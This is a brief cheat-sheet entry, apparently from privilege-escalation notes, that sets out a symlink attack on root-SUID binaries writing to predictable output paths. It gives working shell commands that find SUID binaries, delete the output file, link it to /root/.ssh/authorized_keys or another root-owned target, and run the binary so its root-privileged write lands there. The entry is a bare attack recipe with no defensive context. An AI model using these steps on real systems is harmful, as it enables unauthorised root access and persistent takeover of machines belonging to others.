# SUID Binary Output Path Symlink Attack

If a root-SUID binary writes to a fixed, predictable output path that you own/can delete, replace that path with a symlink to a file you want written as root.

```bash
find / -type f -perm -04000 2>/dev/null    # hunt SUID binaries
rm <output-file-the-binary-writes-to>
ln -s /root/.ssh/authorized_keys <same-path>   # or any other root-owned target
/path/to/suid-binary    # whatever it writes now lands at the symlink target instead
```
